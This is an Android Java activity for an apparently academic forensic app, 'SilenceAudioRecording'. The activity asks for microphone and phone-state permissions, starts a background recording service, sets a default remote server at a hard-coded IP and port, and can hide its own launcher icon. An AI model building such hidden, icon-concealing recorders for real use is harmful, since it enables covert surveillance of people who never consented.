package com.forensic.unipg.silenceaudiorecording;

import android.Manifest;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.inputmethod.EditorInfo;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.TextView;

public class SilenceAudioRecordingActivity extends AppCompatActivity {

    private static final int  REQUEST_RECORD_AUDIO     = 200;
    private static final int  REQUEST_READ_PHONE_STATE = 201;
    private static final ComponentName LAUNCHER_COMPONENT_NAME = new ComponentName(
            "com.forensic.unipg.silenceaudiorecording", "com.forensic.unipg.silenceaudiorecording.Launcher");
    //state
    private boolean acceptRECORD_AUDIO     = false;
    private boolean acceptREAD_PHONE_STATE = false;
    //server values (default)
    InfoServer mInfo = new InfoServer("2.227.12.76",8000);
    //ui elements
    EditText  et_host              = null;
    EditText  et_port              = null;
    CheckBox  cb_rec_audio         = null;
    CheckBox  cb_read_phone_state  = null;
    CheckBox  cb_hide_app_icon     = null;
    Button    bt_service           = null;


    protected void onCreate(Bundle savedInstanceState)
    {
        //init view
        super.onCreate(savedInstanceState);
        //parse
        mInfo.read(getBaseContext());
        //create ui
        createUI();
    }

    private boolean isLauncherIconVisible() {
        int enabledSetting = getPackageManager()
                .getComponentEnabledSetting(LAUNCHER_COMPONENT_NAME);
        return enabledSetting == PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
    }

    void createUI()
    {
        //create view
        setContentView(R.layout.activity_silence_audio_recording);
        //input hide
        this.getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN);
        //connect Button
        bt_service = (Button)findViewById(R.id.bt_service);
        //start state
        uiShowServiceState();
        //add listener
        bt_service.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(isServiceRunning(SilenceAudioRecordingService.class))
                {
                    stopSARService();
                    uiShowServiceStopped();
                }
                else if(acceptRECORD_AUDIO && acceptREAD_PHONE_STATE)
                {
                    startSARService();
                    uiShowServiceRunning();
                }
            }
        });
        //get sw audio
        cb_rec_audio        = (CheckBox)findViewById(R.id.cb_rec_audio);
        //set listeners
        cb_rec_audio.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                requestRecordAudioRuntimePermission();
                uiShowPermission();
            }
        });
        //get sw phone state
        cb_read_phone_state = (CheckBox)findViewById(R.id.cb_read_phone_state);
        //set listeners
        cb_read_phone_state.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                requestReadPhoneStateRuntimePermission();
                uiShowPermission();
            }
        });
        //get app icon state
        cb_hide_app_icon = (CheckBox)findViewById(R.id.cb_hide_icon);
        cb_hide_app_icon.setChecked(!isLauncherIconVisible());
        //attach listener
        cb_hide_app_icon.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                setAppIconVisibility();
            }
        });
        //show
        uiShowPermission();
        //text edit
        et_host = (EditText)findViewById(R.id.et_host);
        et_port = (EditText)findViewById(R.id.et_port);
        //applay info
        et_host.setText(mInfo.mHost);
        et_port.setText(Integer.toString(mInfo.mPort));
        //edit text
        et_host.setOnEditorActionListener(new TextView.OnEditorActionListener() {
            @Override
            public boolean onEditorAction(TextView v, int actionId, KeyEvent event)
            {
                if (actionId == EditorInfo.IME_ACTION_DONE ||
                    actionId == EditorInfo.IME_ACTION_NEXT)
                {
                    String host =  et_host
                                   .getText()
                                   .toString()
                                   .replaceAll("\\s+","");
                    //valid?
                    if(InfoServer.validateHostName(host))
                    {
                        mInfo.mHost = host;
                        mInfo.write(getBaseContext());
                    }
                    //else, test is a recursion safe
                    //      (xml.host isn't valid name)
                    else if(!mInfo.mHost.equals(host))
                    {
                        et_host.setText(mInfo.mHost);
                    }
                }
                return false;
            }
        });
        et_port.addTextChangedListener(new TextWatcher()
        {
            public void beforeTextChanged(CharSequence s, int start, int count, int after){}
            public void onTextChanged(CharSequence s, int start, int before, int count){}
            public void afterTextChanged(Editable s)
            {
                //str port
                String str_port = et_port.getText().toString();
                //no size?
                if(str_port.length() < 1)
                {
                    str_port = "0";
                    et_port.setText(str_port);
                }
                //parse
                mInfo.mPort = Integer.parseInt(str_port);
                //filter
                     if(mInfo.mPort < 0)
                     {
                         mInfo.mPort = 0;
                         et_port.setText(Integer.toString(mInfo.mPort));
                     }
                else if(mInfo.mPort > 65535)
                     {
                         mInfo.mPort = 65535;
                         et_port.setText(Integer.toString(mInfo.mPort));
                     }
                //write
                mInfo.write(getBaseContext());
            }
        });
    }

    void uiShowServiceState()
    {
        if(isServiceRunning(SilenceAudioRecordingService.class))
            uiShowServiceRunning();
        else
            uiShowServiceStopped();
    }

    void uiShowServiceRunning()
    {
        bt_service.setText("STOP SERVICE");
    }

    void uiShowServiceStopped()
    {
        bt_service.setText("START SERVICE");
    }

    void uiShowPermission()
    {
        acceptRECORD_AUDIO = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)  == PackageManager.PERMISSION_GRANTED;
        cb_rec_audio.setChecked(acceptRECORD_AUDIO);
        acceptREAD_PHONE_STATE = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)  == PackageManager.PERMISSION_GRANTED;
        cb_read_phone_state.setChecked(acceptREAD_PHONE_STATE);
    }

    public void requestRecordAudioRuntimePermission()
    {
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECORD_AUDIO}, REQUEST_RECORD_AUDIO);
    }

    public void requestReadPhoneStateRuntimePermission()
    {
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, REQUEST_RECORD_AUDIO);
    }
    public void setAppIconVisibility()
    {
        if(cb_hide_app_icon.isChecked()){
            getPackageManager().setComponentEnabledSetting(LAUNCHER_COMPONENT_NAME,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
                    Log.d("forensic","hiding");
        }
        else{
            getPackageManager().setComponentEnabledSetting(LAUNCHER_COMPONENT_NAME,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);
                    Log.d("forensic","showing");
        }


    }

    private boolean isServiceRunning(Class<?> serviceClass)
    {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE))
        {
            if (serviceClass.getName().equals(service.service.getClassName()))
            {
                return true;
            }
        }
        return false;
    }

    private void startSARService()
    {
        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("SilenceAudioRecordingService.SERVICE_START");
        sendBroadcast(broadcastIntent);
    }

    private void stopSARService()
    {
        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("SilenceAudioRecordingService.SERVICE_STOP");
        sendBroadcast(broadcastIntent);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults)
    {
        switch (requestCode)
        {
            case REQUEST_RECORD_AUDIO:
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)
                {
                    acceptRECORD_AUDIO = true;
                }
                else
                {
                    acceptRECORD_AUDIO = false;
                }
            break;
            case REQUEST_READ_PHONE_STATE:
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)
                {
                    acceptRECORD_AUDIO = true;
                }
                else
                {
                    acceptRECORD_AUDIO = false;
                }
            break;

        }

        uiShowPermission();
    }

    @Override
    protected void onStop()
    {
        //call stop app
        super.onStop();
    }


    @Override
    protected void onDestroy()
    {
        /*
        if(debug)
        {
            Intent intent = new Intent(this, SilenceAudioRecordingService.class);
            stopService(intent);
        }
         */
        //call stop app
        super.onDestroy();
    }
}
